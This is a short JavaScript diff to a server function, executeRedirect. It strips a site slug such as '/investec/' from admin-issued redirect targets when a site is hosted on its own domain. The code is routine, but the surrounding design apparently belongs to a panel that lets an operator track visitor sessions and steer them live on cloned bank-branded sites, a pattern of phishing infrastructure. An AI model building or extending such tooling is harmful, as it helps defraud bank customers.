@@ -54,6 +54,22 @@ async function executeRedirect(io, sessionId, targetUrl, adminUserId) {
   const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);
   if (!session) return;
 
+  // If the website is hosted on its own VPS/domain, strip the /<slug>/ prefix
+  // so redirects work against the site's root (e.g. "/investec/error" → "/error").
+  try {
+    const website = await db.get('SELECT demo_slug, deploy_domain FROM websites WHERE id = ?', [session.website_id]);
+    if (website && website.deploy_domain && website.demo_slug) {
+      const slug = website.demo_slug;
+      // Only strip if target is a relative path starting with /<slug>/
+      const stripRe = new RegExp('^\\/' + slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\/', 'i');
+      if (stripRe.test(targetUrl)) {
+        const original = targetUrl;
+        targetUrl = targetUrl.replace(stripRe, '/');
+        console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
+      }
+    }
+  } catch {}
+
   if (io) {
     try {
       const trackerNsp = io.of('/tracker');
